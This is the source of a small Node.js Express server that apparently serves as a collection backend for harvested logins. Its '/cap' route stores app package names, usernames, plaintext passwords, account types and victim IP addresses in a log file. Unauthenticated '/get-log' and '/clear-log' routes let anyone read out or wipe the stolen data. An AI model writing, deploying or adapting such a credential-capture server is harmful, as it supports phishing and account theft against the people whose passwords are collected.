const bodyParser = require("body-parser");
const express = require("express");
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const moment = require('moment');

const app = express();
app.use(cors());
app.use(bodyParser.json());

app.set("port", process.env.PORT || 3002);

app.get("/", function (req, res) {

    res.send("Thời gian hiện tại : " + Date.now() + '. Bạn đã có thể quay trở lại');

    res.end();
});


app.post("/cap", async function (req, res) {
    try {
        console.log(req.body);
        let packageName = req.body.packageName;
        let username = req.body.username;
        let password = req.body.password;
        let name = req.body.name;
        let accType = req.body.accType;
        let ip = req.body.ip;
        let data = packageName + '|' + username + '|' + password + '|' + name + '|' + accType + '|' + ip + '|' + getNow() + '\n ';
        fs.appendFile('log.txt', data, function (err) {
            if (err) throw err;
            console.log('Saved!');
        });
        return res.json({'time_stamp': getNow(), 'status': 'Success'});
    } catch (e) {
        return res.json({'time_stamp': getNow(), 'status': 'Error'});
    }

});

app.post("/clear-log", async function (req, res) {
    try {
        await fs.writeFileSync('log.txt', '');
        return res.json({'time_stamp': getNow(), 'status': 'Success'});
    } catch (e) {
        return res.json({'time_stamp': getNow(), 'status': 'Error'});
    }

});

app.post("/get-log", async function (req, res) {
    try {
        var filePath = path.join(__dirname, 'log.txt');
        fs.readFile(filePath, {encoding: 'utf-8'}, function (err, data) {
            if (!err) {
                console.log('received data: ' + data);
                // return res.json({'time_stamp': getNow(), 'status': 'Success','data':data});
                return res.send(data);
            } else {
                console.log(err);
            }
        });

    } catch (e) {
        return res.json({'time_stamp': getNow(), 'status': 'Error'});
    }

});

function getNow() {
    return moment().format('DD/MM/YYYY_HH:mm:ss');
}


app.listen(app.get("port"), function () {
    console.log("Listening on port " + app.get("port"));
    console.log(moment().format('DD/MM/YYYY_HH:mm:ss'))
});

